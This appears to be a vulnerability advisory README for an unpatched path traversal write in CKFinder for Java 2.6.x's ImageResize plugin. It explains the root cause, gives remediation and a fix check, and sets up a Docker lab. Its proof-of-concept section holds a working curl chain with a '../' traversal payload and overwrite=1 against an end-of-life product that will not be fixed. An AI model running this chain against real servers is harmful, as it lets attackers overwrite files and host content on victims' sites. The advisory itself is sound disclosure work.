# CKFinder for Java 2.6.x — Unauthenticated Path Traversal Write in ImageResize Plugin

[![Affected](https://img.shields.io/badge/affected-CKFinder%20for%20Java%202.6.2%20%7C%202.6.2.1%20%7C%202.6.3-red)](#affected-versions)
[![Type](https://img.shields.io/badge/CWE--22%20%7C%20CWE--73-Path%20Traversal%20%2F%20File%20Write-orange)](#root-cause)
[![Status](https://img.shields.io/badge/vendor%20status-unfixed%20%2F%20EOL-lightgrey)](#disclosure-timeline)

**English** | [中文说明](#中文说明)

A path traversal write vulnerability exists in the `ImageResizePlugin` bundled with
**CKFinder for Java 2.6.x**. The output file name (`newFileName`) is validated with an
inverted boolean condition (`&&` where `||` was intended) and is then joined into a
filesystem path **without canonicalization**. A non-hidden but otherwise invalid name
(therefore one containing `..`) passes validation, allowing files to be written outside
the configured resource directory — including into directories that are publicly
readable over HTTP. With `overwrite=1`, existing files can be replaced.

Under CKFinder's default authentication model, exploitation requires **no authentication**.

| | |
|---|---|
| **Product** | CKFinder for Java (`ImageResizePlugin`) |
| **Vendor** | CKSource |
| **Affected** | 2.6.2, 2.6.2.1, 2.6.3 (final 2.6.x release) |
| **Not affected** | CKFinder 3.x / 4.x (command rewritten; output name not user-controlled) |
| **CWE** | CWE-22 (primary), CWE-73 |
| **CVSS 3.1** | `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L` → **8.6 (High)** — unauthenticated |
| | `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:L` → **7.5 (High)** — authenticated deployment |
| **Vendor status** | Unfixed. The 2.6.x line is end-of-life (last release 2019-11) |
| **Public status** | No CVE, no vendor advisory, no public exploit *(as of 2026-09)* |

---

## Table of Contents

- [Affected versions](#affected-versions)
- [Root cause](#root-cause)
- [Why the validation is bypassed](#why-the-validation-is-bypassed)
- [Default deployment is unauthenticated](#default-deployment-is-unauthenticated)
- [Impact](#impact)
- [Proof of concept](#proof-of-concept)
- [Reproduce with Docker](#reproduce-with-docker)
- [Verification results](#verification-results)
- [Remediation](#remediation)
- [Disclosure timeline](#disclosure-timeline)
- [References](#references)
- [中文说明](#中文说明)

---

## Affected versions

| Version | Defect present | Notes |
|---|---|---|
| 2.6.2 | Yes | |
| 2.6.2.1 | Yes | Byte-identical to 2.6.2 |
| 2.6.3 | **Yes** | "Security release" — the fix did **not** cover this defect |
| 3.5.1 / 3.6.x / 4.x | No | `ImageResize` rewritten; output name is generated internally |

The defective file is byte-identical across all three affected releases:

```
ImageResizePlugin/src/main/java/com/ckfinder/connector/plugins/ImageResizeCommad.java

2.6.2     sha256 6d30f2db787aa0f61b0b77287e73de714018c6814625bda6d2cb9dea564c0d4f  size 8336
2.6.2.1   sha256 6d30f2db787aa0f61b0b77287e73de714018c6814625bda6d2cb9dea564c0d4f  size 8336
2.6.3     sha256 6d30f2db787aa0f61b0b77287e73de714018c6814625bda6d2cb9dea564c0d4f  size 8336
```

The official 2.6.3 changelog describes only two unrelated fixes:

> Version 2.6.3 — Security release: Fixed file upload vulnerability reported by Joshua Provoste:
> - Fixed logic responsible for uploading files without a file extension.
> - Added documentation that clarifies how to fully protect against content sniffing...

Both correspond to [CVE-2019-15862](https://www.cve.org/CVERecord?id=CVE-2019-15862)
(extensionless upload) and CVE-2019-15891 (content sniffing documentation). Neither concerns
the `ImageResize` plugin.

See [`ADVISORY-hashes.md`](ADVISORY-hashes.md) for the official archive hashes used in this analysis.

---

## Root cause

File: `ImageResizePlugin/src/main/java/com/ckfinder/connector/plugins/ImageResizeCommad.java`
(note the vendor's original spelling: **`Commad`**, not `Command`)

### Defect 1 — boolean logic error (`&&` should be `||`)

```java
if (!FileUtils.checkFileName(this.newFileName)
    && FileUtils.checkIfFileIsHidden(this.newFileName, configuration)) {
    return Constants.Errors.CKFINDER_CONNECTOR_ERROR_INVALID_NAME;
}
```

### Defect 2 — path joined without canonicalization

```java
File thumbFile = new File(configuration.getTypes().get(this.type).getPath()
        + this.currentFolder, this.newFileName);
ImageUtils.createResizedImage(file, thumbFile, this.width, this.height,
        configuration.getImgQuality());
```

---

## Why the validation is bypassed

`FileUtils.checkFileName()` rejects a name if it contains `..`:

```java
public static boolean checkFileName(final String fileName) {
    return !(fileName == null || fileName.equals("")
        || fileName.charAt(fileName.length() - 1) == '.'
        || fileName.contains("..")          // <-- traversal rejected here
        || checkFolderNamePattern(fileName));
}
```

So for a traversal payload such as `xd/../../upload/login/poc.png`:

| Expression | Value | Reason |
|---|---|---|
| `FileUtils.checkFileName(payload)` | `false` | contains `..` |
| `!FileUtils.checkFileName(payload)` | **`true`** | negation of the above |
| `FileUtils.checkIfFileIsHidden(payload, cfg)` | **`false`** | does not start with `.` |
| `true && false` | **`false`** | **guard not taken → request proceeds** |

The condition only rejects a name that is **both** invalid **and** hidden. An invalid name that
is *not* hidden — precisely the shape of a `..` traversal — is never rejected. Written as
intended (`||`), the same payload is rejected immediately:

```
if (!checkFileName(name) || checkIfFileIsHidden(name, cfg))   ->  true  ->  reject
```

### Why a "stepping-stone" directory is used

A payload starting with a dot (e.g. `../upload/x.png`) *does* match the default hidden-file
pattern (`.*`), so it is rejected with error `102`. Prefixing a real, existing sub-directory
(`xd/../../...`) keeps the name from starting with a dot, so it passes the hidden-file check —
and `File` path resolution traverses out of the resource directory normally.

---

## Default deployment is unauthenticated

`Configuration.checkAuthentication()` in the official jar returns `true` unconditionally:

```
$ javap -p -c -cp CKFinder-2.6.2.jar com.ckfinder.connector.configuration.Configuration
  public boolean checkAuthentication(javax.servlet.http.HttpServletRequest);
      Code:
         0: iconst_1
         1: ireturn          // return true — no conditional logic at all

$ javap -p -constants -cp CKFinder-2.6.2.jar com.ckfinder.connector.configuration.IConfiguration
  public static final boolean DEFAULT_CHECKAUTHENTICATION = true;
```

`Command.checkConnector()` is `if (!configuration.enabled() || !configuration.checkAuthentication(request)) throw ...`.
Therefore any deployment that enables the connector **without overriding `checkAuthentication`**
is anonymous-accessible. This is the configuration the bundled sample `WEB-INF/config.xml`
produces, and it is common in the wild.

> **Note for triage:** this is *not* merely a misconfiguration. The defect itself is in
> `ImageResizeCommad` — the code decides the name is invalid and then fails to reject it.
> Authentication only affects *who* can reach the endpoint, not whether the defect exists.
> The proof is in [Remediation](#remediation): changing `&&` to `||` alone stops the traversal
> while leaving the application otherwise untouched. If the behaviour were "by design",
> a one-character change would not fix it.

---

## Impact

An attacker who can reach the connector can:

1. **Write files outside the configured resource directory** to any writable relative path,
   including directories served publicly by the web server;
2. **Replace existing files** by supplying `overwrite=1` (verified: a text file was fully
   replaced by PNG content);
3. **Host attacker-controlled content on the victim's origin** — e.g. phishing or social
   engineering material served over the victim's HTTPS certificate. Cookies scoped to that
   origin, and the trust associated with the domain, apply to that content.

### Constraints (verified, not assumed)

- **Not directly RCE.** The output extension must be on the resource type's allow-list.
  For the `Images` type this is `bmp,gif,jpeg,jpg,png`; `.jsp` is rejected with error `105`.
- **Content is constrained.** The written bytes are either a resampled image or — when the
  requested dimensions equal the source image's dimensions — a **byte-for-byte copy of the
  uploaded source**, which allows arbitrary data appended after the image payload to be
  preserved (verified by hash).
- The resource type used as the source must permit image content (the command calls
  `ImageIO.read()` on the source file).

---

## Proof of concept

Minimal chain (generic; replace `<BASE>` with the connector's deployment prefix):

```bash
BASE='http://<target>'
EP="$BASE/ckfinder/core/connector/java/connector.java"
TOK='0123456789abcdef0123456789abcdef01234567'   # self-chosen; double-submit CSRF

# 1) Upload a source image -> returns {"fileName":"src.png",...}
curl -s -b "ckCsrfToken=$TOK" \
  -F "upload=@marker-1x1.png;type=image/png;filename=src.png" \
  -F "ckCsrfToken=$TOK" -F "CKFinderCommand=true" \
  "$EP?command=QuickUpload&type=Images&currentFolder=%2F&responseType=json"

# 2) Create the stepping-stone directory
curl -s -b "ckCsrfToken=$TOK" \
  --data-urlencode "command=CreateFolder" --data-urlencode "NewFolderName=xd" \
  --data-urlencode "type=Images" --data-urlencode "currentFolder=/" \
  --data-urlencode "ckCsrfToken=$TOK" --data-urlencode "CKFinderCommand=true" "$EP"

# 3) Traversal write (adjust the ../ depth to the target layout)
curl -s -b "ckCsrfToken=$TOK" -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "command=ImageResize" --data-urlencode "type=Images" \
  --data-urlencode "currentFolder=/" --data-urlencode "fileName=src.png" \
  --data-urlencode "newFileName=xd/../../../../upload/login/poc.png" \
  --data-urlencode "width=10" --data-urlencode "height=10" \
  --data-urlencode "overwrite=1" --data-urlencode "ckCsrfToken=$TOK" "$EP"
# -> Error 0
```

> **Request format note.** Two details are easy to get wrong and are *not* product defects:
> `CKFinderCommand=true` must be sent as a **form parameter** (not a header) for native
> commands, otherwise `ConnectorServlet.checkPostRequest()` returns error `109`; and the
> `../` depth depends on how `baseDir` is laid out.

The full automated PoC — including negative controls and the fix check — is in
[`lab/poc/exploit.py`](lab/poc/exploit.py).

---

## Reproduce with Docker

Everything below runs against the **official, unmodified** vendor distribution. No
redistribution of vendor binaries is required: the lab downloads the official WAR at build
time and verifies its SHA-256.

```bash
git clone https://github.com/H1Doujiang/ckfinder-imageresize-path-traversal.git
cd ckfinder-imageresize-path-traversal

docker build -t ckfinder-lab:2.6.2 ./lab
docker run -d --name ckfinder-lab -p 18080:8080 ckfinder-lab:2.6.2
docker exec -it ckfinder-lab /lab/poc/poc.sh
```

Stack: `ubuntu:22.04` + OpenJDK 8 + Apache Tomcat 9.0.99 (javax.servlet). Tomcat 10+ uses
`jakarta.servlet` and cannot run CKFinder 2.6.x.

Lab layout (chosen to mirror a realistic deployment):

```
<webapp>/Resources/userfiles/         <- CKFinder resource directory (the only place it should write)
<webapp>/Resources/userfiles/images/  <- "Images" resource type root
<webapp>/upload/login/                <- target outside the resource dir, anonymously readable
<tomcat>/webapps/shared/              <- second webapp, used for the cross-application case
```

---

## Verification results

Six automated cases, all reproduced on the official 2.6.2 WAR with no code modification:

| # | Case | Result |
|---|---|---|
| T0 | Anonymous `Init` | `Error 0` — no authentication required |
| T1 | Traversal write into a publicly readable directory | `Error 0`; file lands outside the resource dir; anonymous `GET` → `200 image/png` |
| T2 | Cross-application write into another webapp's directory | `Error 0`; anonymously readable |
| T3 | Overwrite semantics | without `overwrite` → `115` and file unchanged; with `overwrite=1` → `Error 0`, original text content fully replaced by PNG |
| T4 | Byte-identical copy mode | output hash **equals** source hash (99 B, including appended trailing data) |
| T5 | Negative controls | dot-prefixed name → `102`; `.jsp` → `105`; missing source → `117`; legitimate in-directory output → `Error 0` |

T5 is the important one: the validation is *not* wholesale broken. Legitimate names are
accepted and specific invalid shapes are rejected — the bypass is a targeted logic error,
not an absent check.

### Fix verification

Applying the two-line change below and recompiling the plugin jar, then re-running the
identical PoC:

| Case | Original | Patched |
|---|---|---|
| T1 traversal write | `Error 0`, file written | **`Error 102`, nothing written** |
| T2 cross-application write | `Error 0`, file written | **`Error 102`, nothing written** |
| T3 overwrite | content replaced | **`Error 102`, file unchanged** |
| T4 byte-identical copy | hash matched | **`Error 102`, nothing written** |

The traversal cases flip from success to `Error 102 (INVALID_NAME)` — confirming both the
root cause and the fix location.

---

## Remediation

### Code fix (vendor)

```java
// 1) Correct the boolean logic
if (!FileUtils.checkFileName(this.newFileName)
    || FileUtils.checkIfFileIsHidden(this.newFileName, configuration)) {
    return Constants.Errors.CKFINDER_CONNECTOR_ERROR_INVALID_NAME;
}

// 2) Canonicalize and enforce the resource-directory boundary
File base = new File(configuration.getTypes().get(this.type).getPath()
        + this.currentFolder).getCanonicalFile();
File thumbFile = new File(base, this.newFileName).getCanonicalFile();
if (!(thumbFile.getPath() + File.separator).startsWith(base.getPath() + File.separator)) {
    return Constants.Errors.CKFINDER_CONNECTOR_ERROR_ACCESS_DENIED;
}
```

`lab/fix-verify/` contains this patch and a script that compiles it, swaps the class into the
official plugin jar, restarts Tomcat, and re-runs the full PoC.

### Mitigation (deployers, in order of effectiveness)

1. **Remove the `imageresize` plugin** from the deployment (or disable the `ImageResize`
   command). This eliminates the exposure entirely.
2. **Migrate to CKFinder 3.x / 4.x** — the 2.6.x line is end-of-life and will not be patched.
3. **Override `checkAuthentication`** in the connector configuration and restrict the
   `accessControls` block; do not grant all permissions to the wildcard role as the bundled
   sample does.
4. Ensure the web server does not serve attacker-writable directories, and keep the CKFinder
   resource directory outside the public web root where possible.

---

## Disclosure timeline

| Date | Event |
|---|---|
| 2026-09-14 | Defect identified and independently reproduced in an isolated lab |
| 2026-09-14 | This advisory published |
| 2026-09-14 | Vendor (CKSource, `security@cksource.com`) notified; 14-day review window |
| *pending* | CVE ID requested from MITRE |
| *pending* | CVE record published |

---

## References

- CKFinder for Java 2.6.2 official distribution —
  `https://download.cksource.com/CKFinder/CKFinder%20for%20Java/2.6.2/ckfinder_java_2.6.2.zip`
- [CVE-2019-15862](https://www.cve.org/CVERecord?id=CVE-2019-15862) — extensionless file upload
  (fixed in 2.6.3; unrelated to this issue)
- [CVE-2019-15891](https://www.cve.org/CVERecord?id=CVE-2019-15891) — content sniffing
  (fixed/documented in 2.6.3; unrelated to this issue)
- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
- [CWE-73: External Control of File Name or Path](https://cwe.mitre.org/data/definitions/73.html)
- [CVE Program policy on End-of-Life products](https://www.cve.org/Resources/Media/Archives/OldWebsite/cve/cna/CVE_Program_End_of_Life_EOL_Assignment_Process.html)

---

## 中文说明

### 一句话

CKFinder for Java 2.6.x 自带的 `ImageResizePlugin` 在输出文件名（`newFileName`）校验上写错了
布尔逻辑（`&&` 应为 `||`），且拼接路径时未做规范化，导致可以携带 `..` 穿越到资源目录之外
写入文件；配合 `overwrite=1` 还能覆盖既有文件。默认部署下**无需认证**。

### 缺陷代码

```java
// 缺陷 1：布尔逻辑写反 —— 只有「既不合法、又是隐藏文件」才拒绝，
//         而穿越名「不合法但不隐藏」，因此永远不会被拒绝
if (!FileUtils.checkFileName(this.newFileName)
    && FileUtils.checkIfFileIsHidden(this.newFileName, configuration)) {
    return Constants.Errors.CKFINDER_CONNECTOR_ERROR_INVALID_NAME;
}

// 缺陷 2：拼路径时未做 canonical 化与边界校验
File thumbFile = new File(configuration.getTypes().get(this.type).getPath()
        + this.currentFolder, this.newFileName);
```

### 影响版本

2.6.2 / 2.6.2.1 / 2.6.3 —— 三版缺陷文件**逐字节完全相同**（sha256 见上）。
2.6.3 这个"安全修复版"只修了无扩展名上传与内容嗅探文档，**遗漏了本缺陷**。

### 为什么这不算"配置问题"

`checkAuthentication()` 默认返回 `true` 确实是官方的默认实现，但**缺陷本体在 `ImageResizeCommad`**：
代码已经判定该文件名非法，却因为逻辑写错而没有拒绝。认证只影响"谁能触发"，
不影响"缺陷是否存在"。

最直接的证据：只把 `&&` 改成 `||`、其余代码不动，穿越立刻被拒（`Error 102`）。
如果这是"设计使然"，一行改动不可能修好它。

### 复现

```bash
docker build -t ckfinder-lab:2.6.2 ./lab
docker run -d --name ckfinder-lab -p 18080:8080 ckfinder-lab:2.6.2
docker exec -it ckfinder-lab /lab/poc/poc.sh
```

### 修复建议

1. `&&` 改为 `||`（修正布尔逻辑）；
2. 输出路径做 `getCanonicalFile()` 并强制校验前缀是否仍在资源目录内；
3. 部署方缓解：移除 `imageresize` 插件 / 覆写 `checkAuthentication` / 收紧 ACL / 迁移到 3.x 或 4.x。

---

## License

The advisory text, PoC scripts and lab files in this repository are released under the
[MIT License](LICENSE). CKFinder itself is commercial software by CKSource and is **not**
redistributed here; the lab downloads it from the vendor's official channel and verifies its hash.
